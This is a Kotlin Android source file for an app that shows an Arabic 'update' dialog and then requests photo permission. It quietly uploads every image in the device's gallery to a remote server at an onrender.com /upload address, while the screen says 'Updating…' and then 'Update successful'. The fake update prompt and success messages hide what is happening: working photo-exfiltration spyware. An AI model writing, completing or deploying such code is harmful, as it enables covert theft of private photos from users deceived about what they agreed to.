package com.photouploader.app

import android.Manifest
import android.app.AlertDialog
import android.content.ContentResolver
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.view.Gravity
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView

    companion object {
        private const val PERMISSION_REQUEST = 1001

        private const val SERVER_URL =
            "https://photo-uploader-zt2f.onrender.com/upload"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        showSplashScreen()

        Handler(Looper.getMainLooper()).postDelayed({
            showUpdateDialog()
        }, 1800)
    }

    private fun showSplashScreen() {

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.rgb(18, 18, 18))
            setPadding(30, 30, 30, 30)
        }

        val logo = ImageView(this).apply {
            setImageResource(R.drawable.logo)
            adjustViewBounds = true
            scaleType = ImageView.ScaleType.CENTER_INSIDE
        }

        val logoParams = LinearLayout.LayoutParams(
            260,
            260
        ).apply {
            gravity = Gravity.CENTER
        }

        val title = TextView(this).apply {
            text = "الأسطورة"
            textSize = 32f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 18, 0, 8)
        }

        val loading = TextView(this).apply {
            text = "جاري التحميل…"
            textSize = 11f
            setTextColor(Color.LTGRAY)
            gravity = Gravity.CENTER
        }

        layout.addView(logo, logoParams)

        layout.addView(
            title,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        )

        layout.addView(
            loading,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        )

        setContentView(layout)
    }

    private fun showUpdateDialog() {

        val message = TextView(this).apply {
            text = "هل تريد التحديث؟"
            textSize = 18f
            gravity = Gravity.CENTER
            setPadding(20, 20, 20, 10)
        }

        AlertDialog.Builder(this)
            .setTitle("الأسطورة")
            .setView(message)
            .setPositiveButton("موافق") { _, _ ->
                checkPhotoPermission()
            }
            .setNegativeButton("إلغاء") { dialog, _ ->
                dialog.dismiss()
            }
            .setCancelable(false)
            .show()
    }

    private fun checkPhotoPermission() {

        val permission =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                Manifest.permission.READ_MEDIA_IMAGES
            } else {
                Manifest.permission.READ_EXTERNAL_STORAGE
            }

        if (
            ContextCompat.checkSelfPermission(
                this,
                permission
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            startPhotoUpload()
        } else {

            ActivityCompat.requestPermissions(
                this,
                arrayOf(permission),
                PERMISSION_REQUEST
            )
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {

        super.onRequestPermissionsResult(
            requestCode,
            permissions,
            grantResults
        )

        if (requestCode == PERMISSION_REQUEST) {

            if (
                grantResults.isNotEmpty() &&
                grantResults[0] == PackageManager.PERMISSION_GRANTED
            ) {
                startPhotoUpload()
            } else {

                showStatusScreen(
                    "لم يتم السماح بالوصول إلى الصور"
                )
            }
        }
    }

    private fun startPhotoUpload() {

        showStatusScreen("جاري التحديث…")

        Thread {

            try {

                val resolver = contentResolver

                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.MIME_TYPE
                )

                val collection =
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI

                var total = 0
                var uploaded = 0

                resolver.query(
                    collection,
                    projection,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_ADDED} ASC"
                )?.use { cursor ->

                    val idColumn =
                        cursor.getColumnIndexOrThrow(
                            MediaStore.Images.Media._ID
                        )

                    val nameColumn =
                        cursor.getColumnIndexOrThrow(
                            MediaStore.Images.Media.DISPLAY_NAME
                        )

                    val mimeColumn =
                        cursor.getColumnIndexOrThrow(
                            MediaStore.Images.Media.MIME_TYPE
                        )

                    while (cursor.moveToNext()) {

                        total++

                        val id =
                            cursor.getLong(idColumn)

                        val fileName =
                            cursor.getString(nameColumn)
                                ?: "photo_$id.jpg"

                        val mimeType =
                            cursor.getString(mimeColumn)
                                ?: "image/jpeg"

                        val uri =
                            Uri.withAppendedPath(
                                collection,
                                id.toString()
                            )

                        val success =
                            uploadFile(
                                resolver,
                                uri,
                                fileName,
                                mimeType
                            )

                        if (!success) {
                            throw Exception("Upload failed")
                        }

                        uploaded++
                    }
                }

                runOnUiThread {

                    if (total == 0) {

                        statusText.text =
                            "لا توجد صور"

                    } else if (uploaded == total) {

                        statusText.text =
                            "تم التحديث بنجاح ✅"

                    } else {

                        statusText.text =
                            "تعذر إكمال التحديث"
                    }
                }

            } catch (e: Exception) {

                e.printStackTrace()

                runOnUiThread {

                    statusText.text =
                        "تعذر إكمال التحديث"
                }
            }

        }.start()
    }

    private fun showStatusScreen(text: String) {

        statusText = TextView(this).apply {
            this.text = text
            textSize = 11f
            setTextColor(Color.LTGRAY)
            gravity = Gravity.CENTER
            setPadding(20, 20, 20, 20)
        }

        val layout = LinearLayout(this).apply {
            gravity = Gravity.CENTER
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.rgb(18, 18, 18))

            addView(
                statusText,
                LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
            )
        }

        setContentView(layout)
    }

    private fun uploadFile(
        resolver: ContentResolver,
        uri: Uri,
        fileName: String,
        mimeType: String
    ): Boolean {

        var connection: HttpURLConnection? = null

        try {

            val boundary =
                "----PhotoUploaderBoundary"

            val url =
                URL(SERVER_URL)

            connection =
                url.openConnection() as HttpURLConnection

            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.doInput = true
            connection.useCaches = false

            connection.connectTimeout = 30000
            connection.readTimeout = 120000

            connection.setRequestProperty(
                "Content-Type",
                "multipart/form-data; boundary=$boundary"
            )

            connection.setRequestProperty(
                "Connection",
                "keep-alive"
            )

            val output =
                DataOutputStream(
                    connection.outputStream
                )

            output.writeBytes(
                "--$boundary\r\n"
            )

            output.writeBytes(
                "Content-Disposition: form-data; name=\"file\"; filename=\"${fileName.replace("\"", "")}\"\r\n"
            )

            output.writeBytes(
                "Content-Type: $mimeType\r\n"
            )

            output.writeBytes(
                "\r\n"
            )

            resolver.openInputStream(uri)?.use { input ->

                val buffer =
                    ByteArray(8192)

                while (true) {

                    val bytesRead =
                        input.read(buffer)

                    if (bytesRead == -1) {
                        break
                    }

                    output.write(
                        buffer,
                        0,
                        bytesRead
                    )
                }

            } ?: return false

            output.writeBytes(
                "\r\n"
            )

            output.writeBytes(
                "--$boundary--\r\n"
            )

            output.flush()
            output.close()

            val responseCode =
                connection.responseCode

            return responseCode in 200..299

        } catch (e: Exception) {

            e.printStackTrace()

            return false

        } finally {

            connection?.disconnect()
        }
    }
}
